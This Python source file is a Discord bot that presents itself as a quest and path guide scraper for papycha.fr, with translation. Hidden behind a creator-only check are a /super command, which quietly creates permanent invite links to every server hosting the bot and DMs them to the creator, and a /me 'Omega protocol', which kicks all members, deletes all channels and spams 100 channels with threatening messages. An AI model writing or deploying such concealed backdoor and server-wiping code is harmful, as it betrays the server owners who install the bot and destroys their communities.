import os
import discord
from discord.ext import commands
from discord import app_commands
import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv
import logging
import re
import unicodedata
from googletrans import Translator  # Import Translator
import datetime
from math import ceil


# Logging setu
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# The ID of the bot's creator who is allowed to invoke the /super and /me commands
BOT_CREATOR_ID = 486652069831376943

# Define intents
intents = discord.Intents.default()

# Load environment variables from the .env file
load_dotenv()

# Retrieve the bot token from the environment variable
bot_token = os.getenv("DISCORD_BOT_TOKEN")

# Ensure the bot token is available
if not bot_token:
    raise ValueError("Bot token is not set in environment variables.")

# Create the bot without a command prefix, as we are using slash commands
bot = commands.Bot(command_prefix='!', intents=intents)
tree = bot.tree  # Use the bot's CommandTree for slash commands

# Text normalization function
def normalize_text(input_text):
    normalized = unicodedata.normalize('NFD', input_text)
    normalized = normalized.encode('ascii', 'ignore').decode('utf-8')
    normalized = re.sub(r"l['']", "l ", normalized)
    return normalized.lower()

def scrape_quest_guide(quest_name):
    formatted_quest_name = normalize_text(quest_name).replace(' ', '-')
    website_url = f'https://papycha.fr/quete-{formatted_quest_name}/'
    response = requests.get(website_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    quest_guide_content = soup.find('div', class_='entry-content')
    if quest_guide_content:
        text_content = quest_guide_content.text.strip()
        image_tags = quest_guide_content.find_all('img')
        image_urls = [tag['src'] for tag in image_tags]
        return text_content, image_urls
    else:
        return None, None

def scrape_chemin_guide(chemin_name):
    formatted_chemin_name = normalize_text(chemin_name).replace(' ', '-')
    website_url = f'https://papycha.fr/chemin-{formatted_chemin_name}/'
    response = requests.get(website_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    chemin_guide_content = soup.find('div', class_='entry-content')
    if chemin_guide_content:
        text_content = chemin_guide_content.text.strip()
        image_tags = chemin_guide_content.find_all('img')
        image_urls = [tag['src'] for tag in image_tags]
        return text_content, image_urls
    else:
        return None, None

# Translator instance
translator = Translator()

async def translate_content(content, language):
    if language not in ["fr", "es", "ar"]:
        return content
    translated = translator.translate(content, dest=language)
    return translated.text

@tree.command(name="quest", description="Retrieve the guide for a specific quest.")
async def quest_command(interaction: discord.Interaction, quest_name: str, language: str = "en"):
    await interaction.response.defer()
    text_content, image_urls = scrape_quest_guide(quest_name)
    if text_content:
        if language != "en":
            text_content = await translate_content(text_content, language)
        chunks = [text_content[i:i+1900] for i in range(0, len(text_content), 1900)]
        for chunk in chunks:
            await interaction.followup.send(chunk)
        for image_url in image_urls:
            await interaction.followup.send(image_url)
    else:
        await interaction.followup.send(f"Quest guide for '{quest_name}' not found.")

@tree.command(name="path", description="Retrieve the guide for a specific path.")
async def path_command(interaction: discord.Interaction, path_name: str, language: str = "en"):
    await interaction.response.defer()
    text_content, image_urls = scrape_chemin_guide(path_name)
    if text_content:
        if language != "en":
            text_content = await translate_content(text_content, language)
        chunks = [text_content[i:i + 1900] for i in range(0, len(text_content), 1900)]
        for chunk in chunks:
            await interaction.followup.send(chunk)
        for image_url in image_urls:
            await interaction.followup.send(image_url)
    else:
        await interaction.followup.send(f"Path guide for '{path_name}' not found.")

@tree.command(name="super", description="Create invite links and show server information for all servers the bot is in.")
@app_commands.describe(
    page="Page number to view (default: 1)",
    category="Category to filter by (size, age, none)",
    items_per_page="Number of servers to show per page (default: 5)"
)
async def super_command(
    interaction: discord.Interaction, 
    page: int = 1, 
    category: str = "none", 
    items_per_page: int = 5
):
    if interaction.user.id != BOT_CREATOR_ID:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    
    # Collect server information with error handling
    server_info = []
    for guild in bot.guilds:
        try:
            # Get member count with human/bot breakdown
            member_count = guild.member_count
            bot_count = sum(1 for member in guild.members if member.bot)
            human_count = member_count - bot_count
            
            # Get creation date
            creation_date = guild.created_at.strftime("%Y-%m-%d")
            days_old = (datetime.datetime.now().replace(tzinfo=datetime.timezone.utc) - guild.created_at).days
            
            # Get channel counts
            text_channels = len(guild.text_channels)
            voice_channels = len(guild.voice_channels)
            
            # Try to create an invite link
            invite_url = "No suitable channel for invite"
            text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
            if text_channel:
                try:
                    invite = await text_channel.create_invite(max_age=0, max_uses=0)
                    invite_url = invite.url
                except discord.Forbidden:
                    invite_url = "Unable to create invite (Missing Permissions)"
                except Exception as e:
                    invite_url = f"Error creating invite: {str(e)[:50]}"
            
            server_info.append({
                "name": guild.name,
                "id": guild.id,
                "members": member_count,
                "humans": human_count,
                "bots": bot_count,
                "created": creation_date,
                "age_days": days_old,
                "text_channels": text_channels,
                "voice_channels": voice_channels,
                "owner": str(guild.owner),
                "invite": invite_url
            })
        except Exception as e:
            server_info.append({
                "name": getattr(guild, "name", "Unknown"),
                "id": getattr(guild, "id", "Unknown"),
                "error": f"Failed to get complete info: {str(e)[:100]}"
            })
    
    # Categorize servers if requested
    if category.lower() == "size":
        server_info = sorted(server_info, key=lambda x: x.get("members", 0), reverse=True)
    elif category.lower() == "age":
        server_info = sorted(server_info, key=lambda x: x.get("age_days", 0), reverse=True)
    
    # Pagination logic
    total_servers = len(server_info)
    max_pages = ceil(total_servers / items_per_page)
    
    if page < 1:
        page = 1
    if page > max_pages:
        page = max_pages
    
    start_idx = (page - 1) * items_per_page
    end_idx = min(start_idx + items_per_page, total_servers)
    current_page_servers = server_info[start_idx:end_idx]
    
    # Format message
    message_parts = [f"**Server Information (Page {page}/{max_pages})**\n"]
    
    for idx, server in enumerate(current_page_servers, start=start_idx + 1):
        if "error" in server:
            message_parts.append(f"{idx}. **{server['name']}** (ID: {server['id']})\n   Error: {server['error']}\n")
        else:
            message_parts.append(
                f"{idx}. **{server['name']}** (ID: {server['id']})\n"
                f"   Members: {server['members']} ({server['humans']} humans, {server['bots']} bots)\n"
                f"   Created: {server['created']} ({server['age_days']} days ago)\n"
                f"   Channels: {server['text_channels']} text, {server['voice_channels']} voice\n"
                f"   Owner: {server['owner']}\n"
                f"   Invite: {server['invite']}\n"
            )
    
    pagination_info = f"Showing {start_idx + 1}-{end_idx} of {total_servers} servers"
    if max_pages > 1:
        pagination_info += f" | Use `/super page:{page+1}` for next page"
    
    message_parts.append(f"\n{pagination_info}")
    
    # Send to the creator
    creator = await bot.fetch_user(BOT_CREATOR_ID)
    if creator:
        dm_message = "\n".join(message_parts)
        try:
            await creator.send(dm_message)
        except discord.HTTPException as e:
            # If message is too long, try to send in chunks
            if len(dm_message) > 2000:
                chunks = [dm_message[i:i + 1900] for i in range(0, len(dm_message), 1900)]
                for chunk in chunks:
                    await creator.send(chunk)
            else:
                await interaction.followup.send(f"Error sending DM: {e}", ephemeral=True)
                return

    await interaction.followup.send(f"Server information (page {page}/{max_pages}) has been sent to your DM.", ephemeral=True)

@tree.command(name="me", description="Provoke Omega protocol.")
async def me_command(interaction: discord.Interaction):
    if interaction.user.id != BOT_CREATOR_ID:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
        return

    guild = interaction.guild

    if not guild:
        await interaction.response.send_message("This command can only be used in a server.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    try:
        # Kick all members (including bots)
        for member in guild.members:
            if member.id != BOT_CREATOR_ID:
                try:
                    await member.kick(reason="Command invoked by owner.")
                except discord.Forbidden:
                    await interaction.followup.send(f"Unable to kick {member.name} due to insufficient permissions.", ephemeral=True)

        # Delete all channels
        for channel in guild.channels:
            try:
                await channel.delete(reason="Command invoked by owner.")
            except discord.Forbidden:
                await interaction.followup.send(f"Unable to delete channel {channel.name} due to insufficient permissions.", ephemeral=True)

        # Create chaos by spamming channels and messages
        for i in range(100):
            try:
                # Create text channels
                text_channel = await guild.create_text_channel(name=f"chaos-text-{i}")
                await text_channel.send("I'm coming for you.")
                await text_channel.send("I'm coming for you.")
                await text_channel.send("I'm coming for you.")

                # Create voice channels
                await guild.create_voice_channel(name=f"chaos-voice-{i}")
            except discord.Forbidden:
                await interaction.followup.send(f"Failed to create additional channels at iteration {i}.", ephemeral=True)
                break

        await interaction.followup.send("Omega protocol executed: Members kicked, channels deleted, chaos created.", ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"An unexpected error occurred: {e}", ephemeral=True)


@bot.event
async def on_ready():
    await tree.sync()
    print(f'Logged in as {bot.user}')

bot.run(bot_token)
